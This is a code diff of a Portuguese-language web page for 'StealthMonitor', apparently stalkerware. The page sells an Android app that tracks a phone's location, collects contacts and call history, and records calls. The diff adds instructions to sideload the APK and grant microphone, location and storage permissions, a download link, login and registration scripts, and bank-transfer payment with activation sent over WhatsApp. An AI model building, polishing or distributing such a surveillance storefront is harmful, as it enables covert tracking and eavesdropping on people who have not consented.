@@ -1,63 +1,218 @@
 <!doctype html>
-<html>
+<html lang="pt">
 <head>
   <meta charset="utf-8"/>
-  <title>DeviceMgr - Login</title>
+  <title>StealthMonitor — Monitoramento & Dashboard</title>
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <link rel="stylesheet" href="/css/styles.css">
+  <style>
+    /* Pequeno CSS inline para garantir layout se o styles.css não tiver regras específicas */
+    :root{--accent:#0b74da;--muted:#6b7280;--bg:#f7fafc;--card:#fff;--radius:12px}
+    *{box-sizing:border-box}
+    body{margin:0;font-family:Inter,Arial,Helvetica,sans-serif;background:var(--bg);color:#0f172a}
+    .wrap{max-width:1100px;margin:28px auto;padding:18px}
+    header{display:flex;align-items:center;justify-content:space-between}
+    .brand{display:flex;align-items:center;gap:12px}
+    .logo{width:52px;height:52px;border-radius:10px;background:linear-gradient(135deg,var(--accent),#06b6d4);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700}
+    nav a{margin-left:12px;color:var(--muted);text-decoration:none}
+    .hero{display:grid;grid-template-columns:1fr 380px;gap:20px;margin-top:18px}
+    .card{background:var(--card);padding:16px;border-radius:var(--radius);box-shadow:0 6px 18px rgba(10,20,40,0.06)}
+    h1{margin:0 0 8px;font-size:26px}
+    p.lead{margin:0;color:var(--muted)}
+    .btn{display:inline-block;padding:10px 14px;border-radius:10px;background:var(--accent);color:#fff;text-decoration:none;font-weight:600}
+    .btn-outline{background:transparent;border:1px solid var(--accent);color:var(--accent)}
+    .features{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:14px}
+    .feature{padding:12px;border-radius:8px;background:#fff;border:1px solid #eef2ff}
+    .small{font-size:13px;color:var(--muted)}
+    .download-row{display:flex;gap:8px;align-items:center;margin-top:12px}
+    .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
+    footer{margin-top:20px;text-align:center;color:var(--muted);font-size:13px}
+    input, button{font-size:14px}
+    input{width:100%;padding:8px;margin:8px 0;border-radius:8px;border:1px solid #e6eef8}
+    #loginMsg,#regMsg{min-height:18px;color:#b91c1c}
+    @media(max-width:900px){ .hero{grid-template-columns:1fr} .features{grid-template-columns:1fr} .grid-2{grid-template-columns:1fr} }
+  </style>
 </head>
 <body>
-  <div class="container">
-    <header><h1>Bem vindo!</h1></header>
-<p> aqui poderás acessar os dados do teu dispositivo, cria uma conta e  inicie a sessão. para mais informações informações <a id="linkMap" href="https://spymb.onrender.com/contacts.html">contacte a nossa equipa. </a>   </p>
-    <div class="grid">
-      <div class="card">
-        <h3>Login</h3> 
-        <input id="email" placeholder="Email" />
-        <input id="password" type="password" placeholder="Password" />
-        <button id="btnLogin">Login</button>
-        <p id="loginMsg" class="small"></p>
+  <div class="wrap">
+    <header>
+      <div class="brand">
+        <div class="logo">SM</div>
+        <div>
+          <strong>StealthMonitor</strong><div class="small">Monitoramento • Dashboard</div>
+        </div>
       </div>
 
-      <div class="card">
-        <h3>Register</h3>
-        <input id="r_email" placeholder="Email" />
-        <input id="r_name" placeholder="Name" />
-        <input id="r_password" type="password" placeholder="Password" />
-        <button id="btnRegister">Register</button>
-        <p id="regMsg" class="small"></p>
+      <nav>
+        <a href="#download">Download</a>
+        <a href="#install">Instalar</a>
+        <a href="#payment">Pagamento</a>
+        <a href="/user/contacts.html">Contactos</a>
+        <a href="/admin/index.html">Admin</a>
+      </nav>
+    </header>
+
+    <section class="hero">
+      <!-- Coluna principal: marketing / features -->
+      <div>
+        <div class="card">
+          <h1>Monitorize dispositivos — localização, contactos e chamadas</h1>
+          <p class="lead">Painel web + App Android para visualização de localização em tempo real, listas de contactos agregados, histórico de chamadas e reprodução de gravações.</p>
+          <div style="margin-top:12px">
+            <a class="btn" href="#download">Descarregar APK</a>
+            <a class="btn btn-outline" href="/login.html" style="margin-left:8px">Entrar</a>
+          </div>
+
+          <div class="features" style="margin-top:16px">
+            <div class="feature"><strong>Mapa interativo</strong><div class="small">Localização em tempo real e histórico</div></div>
+            <div class="feature"><strong>Contactos</strong><div class="small">Lista deduplicada e pesquisável</div></div>
+            <div class="feature"><strong>Gravações</strong><div class="small">Reproduza e baixe chamadas</div></div>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:12px">
+          <h3 id="install">Instalação no Android (passo-a-passo)</h3>
+          <div class="small">
+            <ol>
+              <li>Descarregue o APK no telemóvel através do botão de download.</li>
+              <li>Abra o ficheiro: permita a instalação de apps de fontes desconhecidas (nas definições do browser ou gestor de ficheiros).</li>
+              <li>Instale a app e abra: aceite permissões solicitadas (localização, armazenamento, microfone).</li>
+              <li>Faça login com as credenciais fornecidas pelo administrador.</li>
+            </ol>
+          </div>
+        </div>
       </div>
-    </div>
+
+      <!-- Coluna direita: login/register -->
+      <aside>
+        <div class="card">
+          <h3>Login</h3>
+          <input id="email" placeholder="Email" />
+          <input id="password" type="password" placeholder="Password" />
+          <button id="btnLogin" class="btn">Login</button>
+          <p id="loginMsg" class="small"></p>
+        </div>
+
+        <div class="card" style="margin-top:12px">
+          <h3>Registar</h3>
+          <input id="r_email" placeholder="Email" />
+          <input id="r_name" placeholder="Nome" />
+          <input id="r_password" type="password" placeholder="Password" />
+          <button id="btnRegister" class="btn">Register</button>
+          <p id="regMsg" class="small"></p>
+        </div>
+
+        <div class="card" style="margin-top:12px">
+          <h4 id="download">Download APK</h4>
+          <div class="download-row">
+            <a id="apkLink" class="btn" href="/downloads/app.apk" download>Descarregar APK</a>
+            <a class="btn btn-outline" href="#" id="playSoon">Play Store (em breve)</a>
+          </div>
+          <div class="small" style="margin-top:8px">Tamanho ~6MB • Versão 1.0.0</div>
+        </div>
+
+        <div class="card" style="margin-top:12px">
+          <h4>Suporte</h4>
+          <div class="small">Precisa de ajuda? Contacte via WhatsApp.</div>
+          <div style="margin-top:8px">
+            <!-- Substituir 000000000000 pelo número do admin em formato internacional sem + -->
+            <a id="waBtn" class="btn" href="https://wa.me/000000000000?text=Olá%20--%20preciso%20de%20suporte" target="_blank">WhatsApp</a>
+          </div>
+        </div>
+      </aside>
+    </section>
+
+    <section id="payment" style="margin-top:18px">
+      <div class="card">
+        <h3>Pagamento/manual & ativação</h3>
+        <p class="small">Pagamento por transferência bancária. Após confirmação o admin envia a chave de ativação via WhatsApp.</p>
+
+        <div class="grid-2">
+          <div class="card" style="padding:12px">
+            <strong>Dados para transferência</strong>
+            <div class="small" style="margin-top:6px">
+              Banco: Banco Exemplo<br/>
+              Titular: PHIL ASEAN PROVIDER & LOGISTICS<br/>
+              IBAN: MZ00 0000 0000 0000 0000<br/>
+            </div>
+          </div>
+
+          <div class="card" style="padding:12px">
+            <strong>Notificar pagamento</strong>
+            <div class="small" style="margin-top:6px">Clique para notificar e enviar comprovante ao admin via WhatsApp.</div>
+            <div style="margin-top:8px">
+              <a id="notifyPayment" class="btn" href="https://wa.me/000000000000?text=Fiz%20a%20transferência%20-%20Nome:%20">Notificar via WhatsApp</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      © <span id="year"></span> PHIL ASEAN PROVIDER & LOGISTICS — <span class="small">Todos os direitos reservados</span>
+    </footer>
   </div>
 
   <script src="/js/api.js"></script>
   <script>
+    document.getElementById('year').textContent = new Date().getFullYear();
+
+    // Preserva o comportamento que já tinhas: usa apiFetch do /js/api.js
     document.getElementById('btnLogin').addEventListener('click', async () => {
-      const email = document.getElementById('email').value;
+      const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value;
-      const res = await apiFetch('/api/auth/login', { method:'POST', body: { email, password } });
-      if (res.token) {
-        localStorage.setItem('auth_token', res.token);
-        localStorage.setItem('role', res.role);
-        if (res.role === 'admin') location.href = '/admin/index.html';
-        else location.href = '/user/dashboard.html';
-      } else {
-        document.getElementById('loginMsg').innerText = 'Erro: ' + (res.error || JSON.stringify(res));
+      document.getElementById('loginMsg').textContent = '';
+      try {
+        const res = await apiFetch('/api/auth/login', { method:'POST', body: { email, password } });
+        if (res.token) {
+          localStorage.setItem('auth_token', res.token);
+          localStorage.setItem('role', res.role || 'user');
+          if (res.role === 'admin') location.href = '/admin/index.html';
+          else location.href = '/user/dashboard.html';
+          return;
+        } else {
+          document.getElementById('loginMsg').textContent = 'Erro: ' + (res.error || JSON.stringify(res));
+        }
+      } catch (err) {
+        document.getElementById('loginMsg').textContent = 'Erro de rede';
+        console.error(err);
       }
     });
 
     document.getElementById('btnRegister').addEventListener('click', async () => {
-      const email = document.getElementById('r_email').value;
-      const name = document.getElementById('r_name').value;
+      const email = document.getElementById('r_email').value.trim();
+      const name = document.getElementById('r_name').value.trim();
       const password = document.getElementById('r_password').value;
-      const res = await apiFetch('/api/auth/register', { method:'POST', body: { email, name, password } });
-      if (res.ok) {
-        document.getElementById('regMsg').innerText = 'Registrado. Faz login.';
-      } else {
-        document.getElementById('regMsg').innerText = 'Erro: ' + (res.error || JSON.stringify(res));
+      document.getElementById('regMsg').textContent = '';
+      try {
+        const res = await apiFetch('/api/auth/register', { method:'POST', body: { email, name, password } });
+        if (res.ok) {
+          document.getElementById('regMsg').textContent = 'Registrado. Faça login.';
+        } else {
+          document.getElementById('regMsg').textContent = 'Erro: ' + (res.error || JSON.stringify(res));
+        }
+      } catch (err) {
+        document.getElementById('regMsg').textContent = 'Erro de rede';
+        console.error(err);
       }
     });
+
+    // Opcional: pedir nome antes de notificar pagamento
+    document.getElementById('notifyPayment').addEventListener('click', (e) => {
+      const name = prompt('Nome completo para notificação (opcional):','');
+      if (name === null) { e.preventDefault(); return; } // cancelou
+      const baseHref = e.currentTarget.href.split('?')[0];
+      const phoneMatch = baseHref.match(/wa.me\/([0-9]+)/);
+      const phone = phoneMatch ? phoneMatch[1] : null;
+      const msg = encodeURIComponent(`Fiz a transferência - Nome: ${name || '-'} - Aguardo confirmação`);
+      const url = phone ? `https://wa.me/${phone}?text=${msg}` : `${baseHref}?text=${msg}`;
+      window.open(url, '_blank');
+      e.preventDefault();
+    });
+
+    // Atualiza link de WhatsApp de suporte (substituir 000.. pelo teu número real)
+    document.getElementById('waBtn').href = 'https://wa.me/000000000000?text=Olá%20--%20preciso%20de%20suporte';
+    document.getElementById('apkLink').href = '/downloads/app.apk'; // garantir que o ficheiro exista em /public/downloads
   </script>
 </body>
-    </html>
-          
+</html>
